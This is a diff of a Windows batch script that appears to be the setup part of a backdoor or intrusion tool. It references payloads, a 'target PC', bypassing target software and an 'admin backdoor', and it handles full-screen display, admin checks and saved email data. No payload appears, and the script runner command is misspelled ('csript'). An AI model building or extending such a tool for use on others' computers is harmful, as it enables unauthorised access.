@@ -1,48 +1,50 @@
-:: setup
-  :start
-  @ECHO OFF
-  set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
-  set update_number=V3.33.24
-  set dev=0
-  title unstable Release %update_number%
-  cls
-:: enter full screen
-  :VBSDynamicBuild
-  set TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
-  if exist "%TempVBSFile%" del /F /Q "%TempVBSFile%"
-  echo Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
-  echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
-  echo WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
-  echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
-  csript //nologo "%TempVBSFile%"
-  cls
-:: setup checks
-  :: bypass dev lock if user is owner
-    if %username% equ 61481 goto skip_dev
-    if %username% neq luken if %dev% equ 1 goto dev
-    :skip_dev
-  :: goto check admin perms
-    goto CP
-    :adminyes
-  :: check update logs
-    if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
-    :UPnxt
-  :: check if git is installed
-    git version >git.sav
-    >nul find "version" git.sav && (
-      goto GIT_check_nxt
-    ) || (
-      goto error1
-    )
-    :GIT_check_nxt
-    del git.sav
-  :: check and load saved email data
-    if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
-    :emailnext
-  :: built in anti-virus check
-    if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
-    :no_remove_backdoor
+::startup
+  :: setup
+    :start
+    @ECHO OFF
+    set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
+    set update_number=V3.33.24
+    set dev=1
+    title unstable Release %update_number%
+    cls
+  :: enter full screen
+    :VBSDynamicBuild
+    set TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
+    if exist "%TempVBSFile%" del /F /Q "%TempVBSFile%"
+    echo Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
+    echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
+    echo WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
+    echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
+    csript //nologo "%TempVBSFile%"
+    cls
+  :: setup checks
+    :: bypass dev lock if user is owner
+      if %username% equ 61481 goto skip_dev
+      if %username% neq luken if %dev% equ 1 goto dev
+      :skip_dev
+    :: goto check admin perms
+      goto CP
+      :adminyes
+    :: check update logs
+      if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
+      :UPnxt
+    :: check if git is installed
+      git version >git.sav
+      >nul find "version" git.sav && (
+        goto GIT_check_nxt
+      ) || (
+        goto error1
+      )
+      :GIT_check_nxt
+      del git.sav
+    :: check and load saved email data
+      if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
+      :emailnext
+    :: built in anti-virus check
+      if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
+      :no_remove_backdoor
 :: manual configuration
+  :: ask if user has admin access on target PC
   echo current version: %update_number%
   echo.
   echo [31madmin backdoor is currently broken, do no use this[0m
